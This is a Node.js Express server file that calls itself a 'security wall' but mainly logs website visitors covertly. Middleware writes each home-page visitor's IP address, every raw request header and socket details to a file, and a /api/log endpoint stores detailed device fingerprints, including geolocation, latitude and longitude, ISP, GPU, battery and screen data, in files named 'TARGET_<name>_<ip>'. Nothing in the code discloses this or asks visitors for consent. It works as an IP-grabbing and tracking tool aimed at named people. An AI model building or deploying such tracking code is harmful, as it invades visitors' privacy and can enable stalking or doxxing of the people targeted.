const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Body parser
app.use(express.json());

// ==========================================
// BACKEND SECURITY WALL
// ==========================================

// 1. Helmet: Sets various HTTP headers to secure the app
app.use(helmet({
    contentSecurityPolicy: false, // Disabled for demo purposes so external fonts/data can load
}));

// 2. CORS: Enable Cross-Origin Resource Sharing
app.use(cors());

// 3. Rate Limiting: Prevent DDoS and brute-force attacks
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 requests per `window` (here, per 15 minutes)
    message: 'Too many requests from this IP, please try again after 15 minutes.',
    standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
    legacyHeaders: false, // Disable the `X-RateLimit-*` headers
});

app.use(limiter);

// 4. Hide Express signature
app.disable('x-powered-by');

// Ensure informations directory exists
const infoDir = path.join(__dirname, 'informations');
if (!fs.existsSync(infoDir)) {
    fs.mkdirSync(infoDir);
}

// IP Logging Middleware for site visitors (Logs massive amounts of initial connection data)
app.use((req, res, next) => {
    if (req.path === '/' || req.path === '/index.html') {
        let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        if (ip.includes('::ffff:')) ip = ip.split('::ffff:')[1];
        if (ip === '::1') ip = '127.0.0.1';
        if (ip.includes(',')) ip = ip.split(',')[0].trim();

        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const safeIp = ip.replace(/:/g, '-');
        const filename = `VISITOR_${safeIp}_${timestamp}.txt`;
        const filepath = path.join(infoDir, filename);

        let content = `--- VISITOR CONNECTION LOG ---\n\n`;
        content += `IP ADDRESS: ${ip}\n`;
        content += `EXACT TIME: ${new Date().toISOString()}\n`;
        content += `METHOD: ${req.method}\n`;
        content += `PATH: ${req.originalUrl}\n`;
        content += `PROTOCOL: ${req.protocol}\n`;
        content += `SECURE: ${req.secure}\n`;
        
        content += `\n--- RAW HEADERS DUMP ---\n`;
        for (const [key, value] of Object.entries(req.headers)) {
            content += `${key.toUpperCase()}: ${value}\n`;
        }
        
        content += `\n--- SOCKET INFO ---\n`;
        content += `Local Port: ${req.socket.localPort}\n`;
        content += `Remote Port: ${req.socket.remotePort}\n`;
        content += `Remote Family: ${req.socket.remoteFamily}\n`;

        fs.writeFile(filepath, content, (err) => {
            if (err) console.error("Error writing visitor IP:", err);
            else console.log(`[+] Massive connection payload logged: ${ip}`);
        });
    }
    next();
});

// Serve frontend static files
app.use(express.static(path.join(__dirname, 'public')));

// API Endpoint to save comprehensive fingerprint data
app.post('/api/log', (req, res) => {
    const data = req.body;
    const logEntry = `\n========================================\n` +
                     `NAME: ${data.name || 'Anonymous'}\n` +
                     `TIME: ${data.time} | TZ: ${data.timezone} (Offset: ${data.timeOffset})\n` +
                     `IP: ${data.ip} | GEO: ${data.city}, ${data.region}, ${data.country} (ZIP: ${data.postal})\n` +
                     `LAT/LON: ${data.lat}, ${data.lon} | ISP: ${data.isp} (ASN: ${data.asn})\n` +
                     `NET: ${data.connectionType}, Downlink: ${data.downlink}, RTT: ${data.rtt}, DataSaver: ${data.saveData}\n` +
                     `OS: ${data.os} (${data.platform}) | BROWSER: ${data.browser}\n` +
                     `HW: ${data.cores} Cores, ${data.memory} RAM, GPU: ${data.gpu}\n` +
                     `DISPLAY: ${data.screen} (Avail: ${data.availScreen}, Colors: ${data.colorDepth}-bit, Ratio: ${data.pixelRatio})\n` +
                     `TOUCH: ${data.touch} | BATTERY: ${data.battery} | LANG: ${data.language} (${data.languages})\n` +
                     `FEATURES: DNT(${data.dnt}), Cookies(${data.cookies}), PDFViewer(${data.pdfViewer}), Bot(${data.webdriver})\n` +
                     `USER_AGENT: ${data.userAgent}\n` +
                     `========================================\n`;

    const safeIp = (data.ip || "unknown").replace(/:/g, '-');
    const safeName = (data.name || "Target").replace(/[^a-zA-Z0-9]/g, '_');
    const filename = `TARGET_${safeName}_${safeIp}_${Date.now()}.txt`;
    
    fs.writeFile(path.join(infoDir, filename), logEntry, (err) => {
        if (err) console.error("Error writing to precise target log:", err);
    });

    res.json({ success: true });
});

// Fallback to index.html for SPA (if needed)
app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start Server
app.listen(PORT, () => {
    console.log(`[SECURITY SYSTEM ONLINE] Server running on port ${PORT}`);
});
